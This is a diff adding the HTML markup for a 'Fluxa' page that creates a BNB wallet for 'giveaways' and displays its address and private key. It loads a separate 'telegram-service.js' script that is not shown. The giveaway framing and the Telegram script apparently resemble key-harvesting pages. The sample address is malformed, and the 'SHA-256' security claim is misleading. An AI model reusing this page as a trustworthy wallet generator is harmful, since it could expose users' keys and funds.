@@ -1,0 +1,173 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Create Wallet - Fluxa</title>
+    <link href="wallet-style.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+    <div class="container">
+        <div class="wallet-card">
+            <!-- Header -->
+            <div class="header">
+                <button class="back-btn" onclick="goBack()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M19 12H5"/>
+                        <path d="M12 19l-7-7 7-7"/>
+                    </svg>
+                </button>
+                <h1>Create Wallet</h1>
+                <div></div>
+            </div>
+
+            <!-- Create Form -->
+            <div class="create-content" id="createForm">
+                <!-- Plus Icon -->
+                <div class="wallet-icon-section">
+                    <div class="icon-circle-gold">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                            <line x1="12" y1="5" x2="12" y2="19"/>
+                            <line x1="5" y1="12" x2="19" y2="12"/>
+                        </svg>
+                    </div>
+                    <h3>New BNB Wallet</h3>
+                    <p class="subtitle">Generate a secure wallet for BNB giveaways</p>
+                </div>
+                
+                <!-- Wallet Features -->
+                <div class="features-card">
+                    <h4>Wallet Features</h4>
+                    <div class="features-list">
+                        <div class="feature-item">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M20 6L9 17l-5-5"/>
+                            </svg>
+                            <span>BNB Smart Chain Compatible</span>
+                        </div>
+                        <div class="feature-item">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M20 6L9 17l-5-5"/>
+                            </svg>
+                            <span>Giveaway Eligible</span>
+                        </div>
+                        <div class="feature-item">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M20 6L9 17l-5-5"/>
+                            </svg>
+                            <span>SHA-256 Secure Generation</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn-gold" onclick="generateWallet()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+                    </svg>
+                    Generate Wallet
+                </button>
+                
+                <!-- Warning Section -->
+                <div class="warning-card">
+                    <div class="warning-content">
+                        <div class="warning-icon">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                                <line x1="12" y1="9" x2="12" y2="13"/>
+                                <line x1="12" y1="17" x2="12.01" y2="17"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <h4>Important</h4>
+                            <p>Save your private key securely. We cannot recover lost wallets.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Wallet Success Section (Hidden initially) -->
+            <div class="wallet-success" id="walletSuccess" style="display: none;">
+                <!-- Success Icon -->
+                <div class="wallet-icon-section">
+                    <div class="icon-circle-gold">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                            <path d="M20 6L9 17l-5-5"/>
+                        </svg>
+                    </div>
+                    <h3>Wallet Created Successfully!</h3>
+                    <p class="subtitle">Save your wallet details securely</p>
+                </div>
+
+                <!-- Wallet Details -->
+                <div class="wallet-details-card">
+                    <div class="detail-section">
+                        <div class="detail-header">
+                            <h4>Wallet Address</h4>
+                            <button class="copy-btn" onclick="copyAddress()">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="detail-value" id="walletAddress">
+                            0xE35Ec4006042CE85066CBcBC267800FC7E7F5FDE0
+                        </div>
+                    </div>
+
+                    <div class="detail-section">
+                        <div class="detail-header">
+                            <h4>Private Key</h4>
+                            <div class="key-actions">
+                                <button class="toggle-btn" onclick="togglePrivateKey()">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                                        <circle cx="12" cy="12" r="3"/>
+                                    </svg>
+                                </button>
+                                <button class="copy-btn" onclick="copyPrivateKey()">
+                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                        <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                                        <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                                    </svg>
+                                </button>
+                            </div>
+                        </div>
+                        <div class="detail-value private-key-hidden" id="privateKey">
+                            ••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Security Warning -->
+                <div class="security-warning-card">
+                    <div class="warning-content">
+                        <div class="warning-icon">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+                                <line x1="12" y1="9" x2="12" y2="13"/>
+                                <line x1="12" y1="17" x2="12.01" y2="17"/>
+                            </svg>
+                        </div>
+                        <div>
+                            <h4>Security Warning</h4>
+                            <p>Never share your private key with anyone. Store it securely offline. Anyone with your private key can access your funds.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <button class="btn-gold" onclick="continueToDashboard()">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M20 6L9 17l-5-5"/>
+                    </svg>
+                    Continue to Dashboard
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script src="telegram-service.js"></script>
+    <script src="create-script.js"></script>
+</body>
+</html>
